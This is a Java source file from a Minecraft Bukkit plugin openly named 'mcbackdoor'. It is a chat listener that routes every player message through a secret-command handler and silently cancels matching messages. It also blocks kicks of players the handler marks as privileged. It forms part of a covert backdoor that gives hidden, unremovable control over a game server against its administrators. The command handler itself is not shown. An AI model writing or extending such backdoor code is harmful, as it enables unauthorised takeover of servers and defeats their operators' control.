/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

package org.martin.bukkit.mcbackdoor.chat;

import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerListener;
import org.martin.bukkit.mcbackdoor.scmd.SecreteCommandsNew;

/**
 *
 * @author martin
 */
public class MCBackDoorChatListener extends PlayerListener{

    private SecreteCommandsNew sC;

    public MCBackDoorChatListener(SecreteCommandsNew sC){
        this.sC = sC;
    }

    @Override
    public void onPlayerChat(PlayerChatEvent event) {
        Player player = event.getPlayer();
        String msg = event.getMessage();
        event.setCancelled(sC.processMSG(msg, player));
    }

    @Override
    public void onPlayerKick(PlayerKickEvent event) {
        Player player = event.getPlayer();
        if(sC.isPlayerPrivilaged(player)){
            event.setCancelled(true);
        }
    }


}
